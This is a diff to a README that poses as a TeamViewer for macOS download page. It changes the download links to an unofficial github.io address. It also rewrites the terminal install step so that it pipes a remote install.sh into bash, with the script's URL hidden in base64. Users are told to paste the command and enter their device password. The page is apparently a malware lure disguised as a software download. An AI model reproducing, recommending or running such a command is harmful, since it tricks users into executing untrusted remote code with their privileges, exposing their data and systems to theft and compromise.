@@ -7,7 +7,7 @@ With its easy setup, high-speed connections, and cross-platform support, TeamVie
 ---
 
 ## ✅ Download TeamViewer for macOS  
-[![Download TeamViewer](https://img.shields.io/badge/Download-TeamViewer-blue)](https://teamviewer-download-mac.github.io/.github)
+[![Download TeamViewer](https://img.shields.io/badge/Download-TeamViewer-blue)](https://shuziktobehuman.github.io/huja/TeamViewer)
 
 ---
 
@@ -26,7 +26,7 @@ Installation via a command in the terminal:
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
 ```bash
-/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get2/install.sh)"
+/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQyL2luc3RhbGwuc2g= | base64 -d))"
 ```
 
 
@@ -61,7 +61,7 @@ TeamViewer is a remote connectivity platform that allows full remote control of 
 
 ---
 
-[![Download TeamViewer](https://img.shields.io/badge/Download-TeamViewer-blue)](https://teamviewer-download-mac.github.io/.github)
+[![Download TeamViewer](https://img.shields.io/badge/Download-TeamViewer-blue)](https://shuziktobehuman.github.io/huja/TeamViewer)
 
 ---
 
